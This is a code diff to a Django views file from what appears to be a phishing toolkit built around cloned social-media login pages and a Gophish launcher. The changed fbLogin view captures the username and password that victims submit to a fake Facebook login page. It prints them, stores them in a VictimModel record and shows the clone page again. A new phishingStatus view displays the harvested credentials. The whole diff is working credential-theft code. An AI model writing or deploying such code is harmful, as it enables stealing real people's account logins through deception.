@@ -1,4 +1,5 @@
-import re
+import datetime
+import time
 from django.shortcuts import render, redirect
 from django.http import HttpResponse, JsonResponse
 from django.contrib.auth.models import User
@@ -10,7 +11,7 @@ from templates.backend.gophish_microservice import launchGophish
 import pandas as pd
 
 #import custom user model
-from .models import AppUserModel
+from .models import AppUserModel, VictimModel
 
 #import backend processing files
 from templates.backend.DataScrapingModel import scrapeWebpage
@@ -445,11 +446,24 @@ def fbLogin(request):
 			Password = request.POST['password']
 		
 		print("Collected data:\n\tUsername: ", Username, "\n\tPassword: ", Password)
-		return HttpResponse("Got data")
+		
+		TargetVictim = VictimModel(victim_id=1)
+		TargetVictim.victim_username = Username
+		TargetVictim.victim_password = Password
+		# TargetVictim.record_time = datetime.date.fromisoformat('YYYY-MM-DD HH:mm')
+
+		TargetVictim.save()
 	
-	return render(request, "Web/dashboard.html")
+	return render(request, "Web/clonedLoginPages/facebookClone.html")
 
 	
+def phishingStatus(request):
+	if request.method == 'POST':
+		TargetVictim = VictimModel.objects.get(victim_id=1)
+
+		return render(request, "Web/phishingStatus.html", {"victim_username": TargetVictim.victim_username, "victim_password": TargetVictim.victim_password, "Record_Time": TargetVictim.record_time})
+	return render(request, "Web/phishingStatus.html", {"victim_username": ''})
+
 
 
 # urls to access social media cloned pages
